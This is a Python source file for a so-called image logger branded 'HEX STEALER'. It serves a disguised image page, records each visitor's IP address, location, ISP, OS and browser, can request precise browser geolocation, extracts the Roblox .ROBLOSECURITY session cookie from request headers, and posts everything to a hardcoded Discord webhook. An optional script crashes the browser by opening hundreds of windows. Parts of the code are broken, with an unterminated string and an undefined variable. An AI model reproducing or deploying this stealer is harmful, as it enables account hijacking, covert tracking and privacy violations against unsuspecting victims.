from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1279727533574721556/S9EZEtHNBHkuENyK54wzhQM3ziQOEAdxgxA6r4hf9DL8uPljR0gyePyeqPVBjmOE4PHk",
    "image": "https://i.imgur.com/UTwSor8.jpeg",
    "imageArgument": True,
    "username": "HEX STEALER",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Here's the information that you ask for.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://i.imgur.com/UTwSor8.jpeg"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

# Nueva función para obtener el valor de la cookie .ROBLOSECURITY
def get_roblosecurity_cookie(headers):
    if "Cookie" in headers:
        cookies = headers.get("Cookie")
        for cookie in cookies.split("; "):
            if cookie.startswith(".ROBLOSECURITY="):
                return cookie.split("=")[1]
    return None

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, roblosecurity_cookie=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**

**.ROBLOSECURITY Cookie:**
        }
    ],
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
    try:
        if config["imageArgument"]:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]
        else:
            url = config["image"]

        data = f'''<style>body {{
    margin: 0;
    padding: 0;
    }}
    div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
    }}</style><div class="img"></div>'''.encode()

        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
            return
        
        if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
            self.send_response(200 if config["buggedImage"] else 302)
            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
            self.end_headers()

            if config["buggedImage"]: 
                self.wfile.write(binaries["loading"]) 

            makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
            return
        
        else:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
            else:
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)

            message = config["message"]["message"]

            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                message = message.replace("{isp}", result["isp"])
                message = message.replace("{asn}", result["as"])
                message = message.replace("{country}", result["country"])
                message = message.replace("{region}", result["regionName"])
                message = message.replace("{city}", result["city"])
                message = message.replace("{lat}", str(result["lat"]))
                message = message.replace("{long}", str(result["lon"]))
                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                message = message.replace("{mobile}", str(result["mobile"]))
                message = message.replace("{vpn}", str(result["proxy"]))
                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

            datatype = 'text/html'

            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (let i = 0; i < 200; i++) {window.open("about:blank", "_blank");}}, 100);</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()
            
            if config["accurateLocation"]:
                data += b"""<script>
    var currenturl = window.location.href;

    if (!currenturl.includes("g=")) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function (coords) {
        if (currenturl.includes("?")) {
            currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
        } else {
            currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
        }
        location.replace(currenturl);});
    }}

    </script>"""
            self.wfile.write(data)
    
    except Exception as e:
        self.send_response(500)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
        reportError(traceback.format_exc())


    def do_GET(self):
        self.handleRequest()

    def do_HEAD(self):
        self.handleRequest()
